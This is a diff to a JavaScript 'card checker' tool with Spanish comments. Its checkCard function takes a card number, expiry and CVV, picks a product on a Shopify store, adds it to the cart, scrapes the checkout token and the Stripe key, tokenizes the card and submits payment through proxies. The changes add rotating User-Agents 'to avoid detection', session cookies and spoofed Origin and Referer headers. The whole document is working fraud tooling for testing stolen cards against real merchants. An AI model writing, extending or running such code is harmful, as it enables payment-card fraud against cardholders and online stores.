@@ -35,6 +35,14 @@ function createProxyAgent(proxyConfig) {
   return new HttpsProxyAgent(url);
 }
 
+// Generar un User-Agent aleatorio real para no ser detectados
+const userAgents = [
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1'
+];
+const getRandomUA = () => userAgents[Math.floor(Math.random() * userAgents.length)];
+
 // ==========================================
 // PASO 1: OBTENER VARIANT_ID POR PRECIO
 // ==========================================
@@ -42,7 +50,7 @@ async function getVariantIdByPrice(site, targetPrice, proxyAgent) {
   try {
     const response = await axios.get(`${site}/products.json?limit=250`, {
       headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'User-Agent': getRandomUA(),
         'Accept': 'application/json'
       },
       httpsAgent: proxyAgent,
@@ -53,9 +61,11 @@ async function getVariantIdByPrice(site, targetPrice, proxyAgent) {
     if (products.length === 0) return null;
 
     if (!targetPrice || targetPrice <= 0) {
+      const variant = products[0].variants[0];
       return {
-        variantId: products[0].variants[0].id,
-        price: parseFloat(products[0].variants[0].price),
+        variantId: variant.id,
+        productHandle: products[0].handle, // NECESITAMOS EL HANDLE
+        price: parseFloat(variant.price),
         productTitle: products[0].title
       };
     }
@@ -81,6 +91,7 @@ async function getVariantIdByPrice(site, targetPrice, proxyAgent) {
 
     return {
       variantId: bestVariant.id,
+      productHandle: bestProduct.handle, // NECESITAMOS EL HANDLE
       price: parseFloat(bestVariant.price),
       productTitle: bestProduct.title
     };
@@ -91,28 +102,44 @@ async function getVariantIdByPrice(site, targetPrice, proxyAgent) {
 }
 
 // ==========================================
-// PASO 2: AÑADIR AL CARRITO
+// PASO 2: AÑADIR AL CARRITO (CON COOKIES)
 // ==========================================
-async function addToCart(site, variantId, proxyAgent, cookieJar) {
+async function addToCart(site, productHandle, variantId, proxyAgent, cookieJar) {
   try {
     const client = wrapper(axios.create({ jar: cookieJar, httpsAgent: proxyAgent }));
-    
-    const response = await client.post(`${site}/cart/add.js`, {
-      id: variantId,
-      quantity: 1
-    }, {
+    const ua = getRandomUA();
+
+    // 1. Primero visitamos la página del producto para obtener las cookies de sesión (cart_currency, _shopify_s, etc.)
+    await client.get(`${site}/products/${productHandle}`, {
       headers: {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'User-Agent': ua,
+        'Accept': 'text/html,application/xhtml+xml',
+        'Accept-Language': 'en-US,en;q=0.9'
+      },
+      timeout: 15000
+    }).catch(() => {}); // Ignoramos si falla, solo queremos las cookies
+
+    // 2. Ahora intentamos añadir al carrito usando esas cookies
+    const response = await client.post(`${site}/cart/add.js`, 
+      new URLSearchParams({
+        'id': variantId,
+        'quantity': '1'
+      }).toString(),
+      {
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': ua,
         'Accept': 'application/json',
-        'X-Requested-With': 'XMLHttpRequest'
+        'X-Requested-With': 'XMLHttpRequest',
+        'Origin': site,
+        'Referer': `${site}/products/${productHandle}`
       },
       timeout: 15000
     });
 
     return response.status === 200;
   } catch (e) {
-    console.error(`[addToCart] ${e.message}`);
+    console.error(`[addToCart] Error: ${e.response ? JSON.stringify(e.response.data) : e.message}`);
     return false;
   }
 }
@@ -126,7 +153,7 @@ async function getCheckoutToken(site, proxyAgent, cookieJar) {
     
     const response = await client.get(`${site}/checkout`, {
       headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'User-Agent': getRandomUA(),
         'Accept': 'text/html,application/xhtml+xml'
       },
       timeout: 20000
@@ -134,13 +161,15 @@ async function getCheckoutToken(site, proxyAgent, cookieJar) {
 
     const html = response.data;
     
+    // Buscar el checkout token en el nuevo Shopify Checkout (suele estar en un JSON embebido)
     const tokenMatch = html.match(/"checkout_token"\s*:\s*"([^"]+)"/) || 
                        html.match(/name="checkout_token"\s+value="([^"]+)"/) ||
                        html.match(/"token"\s*:\s*"([^"]+)"/);
     
     const token = tokenMatch ? tokenMatch[1] : null;
     
-    const stripeKeyMatch = html.match(/pk_live_[A-Za-z0-9]+/);
+    // Buscar la llave de Stripe (si la tienda usa Stripe/Shopify Payments)
+    const stripeKeyMatch = html.match(/pk_live_[A-Za-z0-9]+/) || html.match(/pk_test_[A-Za-z0-9]+/);
     const stripeKey = stripeKeyMatch ? stripeKeyMatch[0] : null;
     
     return { token, stripeKey, html };
@@ -169,7 +198,7 @@ async function tokenizeCard(cardNumber, month, year, cvv, stripeKey, proxyAgent)
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded',
           'Authorization': `Bearer ${stripeKey}`,
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+          'User-Agent': getRandomUA()
         },
         httpsAgent: proxyAgent,
         timeout: 15000
@@ -207,9 +236,11 @@ async function submitPayment(site, token, paymentMethodId, proxyAgent, cookieJar
     }, {
       headers: {
         'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'User-Agent': getRandomUA(),
         'Accept': 'application/json',
-        'X-Requested-With': 'XMLHttpRequest'
+        'X-Requested-With': 'XMLHttpRequest',
+        'Origin': site,
+        'Referer': `${site}/checkout`
       },
       timeout: 30000
     });
@@ -257,16 +288,19 @@ async function checkCard(site, cc, targetPrice, proxyConfig) {
     const proxyAgent = createProxyAgent(proxyConfig);
     const cookieJar = new CookieJar();
 
+    // 1. Obtener producto
     const productData = await getVariantIdByPrice(normalizedSite, targetPrice, proxyAgent);
     if (!productData) {
       return { Response: "Site Error: No product found for price", Price: 0, Gateway: "Shopify", Status: false };
     }
 
-    const added = await addToCart(normalizedSite, productData.variantId, proxyAgent, cookieJar);
+    // 2. Añadir al carrito (Ahora pasamos el handle y usamos cookies)
+    const added = await addToCart(normalizedSite, productData.productHandle, productData.variantId, proxyAgent, cookieJar);
     if (!added) {
       return { Response: "Site Error: Failed to add to cart", Price: productData.price, Gateway: "Shopify", Status: false };
     }
 
+    // 3. Checkout
     const checkoutData = await getCheckoutToken(normalizedSite, proxyAgent, cookieJar);
     if (!checkoutData || !checkoutData.token) {
       return { Response: "Site Error: Failed to get checkout token", Price: productData.price, Gateway: "Shopify", Status: false };
@@ -276,6 +310,7 @@ async function checkCard(site, cc, targetPrice, proxyConfig) {
       return { Response: "Site Error: Unsupported gateway (no Stripe key)", Price: productData.price, Gateway: "Shopify", Status: false };
     }
 
+    // 4. Tokenizar tarjeta
     const [cardNumber, month, year, cvv] = cc.split('|');
     const fullYear = year.length === 2 ? `20${year}` : year;
     const paymentMethodId = await tokenizeCard(cardNumber, month, fullYear, cvv, checkoutData.stripeKey, proxyAgent);
@@ -288,6 +323,7 @@ async function checkCard(site, cc, targetPrice, proxyConfig) {
       return { Response: `Declined (${paymentMethodId.error})`, Price: productData.price, Gateway: "Shopify", Status: false };
     }
 
+    // 5. Pagar
     const result = await submitPayment(normalizedSite, checkoutData.token, paymentMethodId, proxyAgent, cookieJar);
     result.Price = productData.price;
     return result;
